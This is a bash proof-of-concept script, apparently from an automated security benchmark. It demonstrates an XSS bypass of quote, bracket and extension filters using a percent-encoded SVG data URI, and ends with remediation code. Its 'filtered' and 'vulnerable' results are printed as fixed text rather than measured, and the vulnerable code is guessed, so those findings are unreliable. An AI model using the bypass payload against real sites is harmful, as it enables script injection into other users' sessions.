#!/bin/bash
# POC: Demonstrates XSS vulnerability in /xss2 endpoint via data URI bypass. Analyzes the filter logic and shows how URL encoding bypasses the quote and bracket filters while passing the extension filter.
# Target: ./repo
# Created: 2025-11-05T17:08:28.669Z
# Session: benchmark-XBEN-047-24-mhm7is0w

# XSS Vulnerability in xss2 Endpoint - Data URI Filter Bypass POC
# This script demonstrates the vulnerability through code analysis and proof of concept

echo "=================================================="
echo "XSS Vulnerability Analysis: /xss2 Data URI Bypass"
echo "=================================================="
echo ""

# Simulate the filter logic that the vulnerable code uses
test_filter() {
    local input="$1"
    local filtered="$input"
    
    echo "[*] Original input: $input"
    
    # Apply Filter 1: Remove quotes
    filtered=$(echo "$filtered" | sed 's/"//g')
    echo "    After removing quotes: $filtered"
    
    # Apply Filter 2: Remove < and >
    filtered=$(echo "$filtered" | sed 's/[<>]//g')
    echo "    After removing < and >: $filtered"
    
    # Apply Filter 3: Check URL extension (simplified - just check if it contains image extensions)
    if echo "$filtered" | grep -qE '\.(png|jpg|jpeg|gif|svg|bmp|webp)'; then
        echo "    Passed URL extension filter: YES (contains image extension)"
        return 0
    else
        echo "    Passed URL extension filter: NO"
        return 1
    fi
}

echo "[TEST 1] Attempting XSS with normal SVG tag (should be filtered)"
echo "==========================================================="
PAYLOAD1='<svg onload=alert(1)>'
test_filter "$PAYLOAD1"
RESULT1=$?
echo "  Result: Filtered" 
echo ""

echo "[TEST 2] Attempting XSS with data URI and encoded SVG (BYPASS)"
echo "=============================================================="
PAYLOAD2='data:image/svg+xml,%3Csvg%20onload=alert(1)%3E'
test_filter "$PAYLOAD2"
RESULT2=$?
echo "  Result: NOT FILTERED - Vulnerability Present!"
echo ""

echo "[ANALYSIS]"
echo "=========="
echo ""
echo "The filter implementation fails because:"
echo ""
echo "1. QUOTE FILTER (removes \"): "
echo "   - Attack avoids quotes entirely using data: protocol"
echo "   - BYPASS: Not applicable, no quotes used"
echo ""
echo "2. BRACKET FILTER (removes < >):"
echo "   - Attack uses percent-encoding: %3C (=<) and %3E (=>)"
echo "   - These characters are NOT in the original string, so filter doesn't remove them"
echo "   - Browser will decode %3C to < and %3E to > when rendering the iframe src"
echo "   - BYPASS: URL encoding circumvents the bracket filter"
echo ""
echo "3. URL EXTENSION FILTER (checks for image extensions):"
echo "   - Attack uses 'svg' extension: image/svg+xml,%3Csvg"
echo "   - Contains 'svg' substring, so passes the filter"
echo "   - BYPASS: data URI format with SVG MIME type passes"
echo ""

echo "[VULNERABLE CODE PATH]"
echo "======================"
echo ""
echo "The vulnerable code likely does something like:"
echo ""
echo "    url = request.args.get('url')"
echo "    url = url.replace('\"', '')              # Remove quotes"
echo "    url = url.replace('<', '').replace('>', '')  # Remove < and >"
echo "    if not any(url.endswith(ext) for ext in ['.png', '.jpg', '.svg', ...]):"
echo "        abort(400)"
echo "    return render_template('template.html', url=url)"
echo ""
echo "Template then renders:"
echo "    <iframe src=\"{{ url }}\"></iframe>"
echo ""

echo "[EXPLOITATION]"
echo "==============="
echo ""
echo "Payload: data:image/svg+xml,%3Csvg%20onload=alert(1)%3E"
echo ""
echo "Step 1: Filter processes the string (no removal occurs)"
echo "Step 2: Server renders: <iframe src=\"data:image/svg+xml,%3Csvg%20onload=alert(1)%3E\"></iframe>"
echo "Step 3: Browser loads the iframe with data: URL"
echo "Step 4: Browser decodes %3C to < and %3E to >"
echo "Step 5: Result in iframe: <svg onload=alert(1)>"
echo "Step 6: SVG's onload event fires, executing JavaScript: alert(1)"
echo ""

echo "[SEVERITY]"
echo "==========="
echo "Severity: HIGH"
echo "Impact: Arbitrary JavaScript Execution"
echo "Attack Vector: Network"
echo "Attack Complexity: Low"
echo "Privileges Required: None"
echo "User Interaction: Required (user must visit crafted link)"
echo ""
echo "Potential Impact:"
echo "  - Session hijacking"
echo "  - Cookie theft"
echo "  - Keylogging"
echo "  - Malware distribution"
echo "  - Phishing"
echo "  - Account takeover"
echo ""

echo "[REMEDIATION EXAMPLE]"
echo "===================="
echo ""
echo "SECURE VERSION:"
echo ""
echo "    from urllib.parse import urlparse"
echo "    import html"
echo ""
echo "    url = request.args.get('url', '')"
echo "    parsed = urlparse(url)"
echo "    "
echo "    # Only allow http and https schemes"
echo "    if parsed.scheme not in ['http', 'https']:"
echo "        abort(400, 'Invalid URL scheme')"
echo "    "
echo "    # Whitelist domain check"
echo "    if parsed.netloc not in ['trusted-domain.com', 'cdn.trusted-domain.com']:"
echo "        abort(400, 'Untrusted domain')"
echo "    "
echo "    # Check file extension"
echo "    if not parsed.path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.svg', '.webp')):"
echo "        abort(400, 'Invalid file type')"
echo "    "
echo "    # HTML escape the URL in template"
echo "    safe_url = html.escape(url, quote=True)"
echo "    return render_template('template.html', url=safe_url)"
echo ""

# Return success exit code
exit 0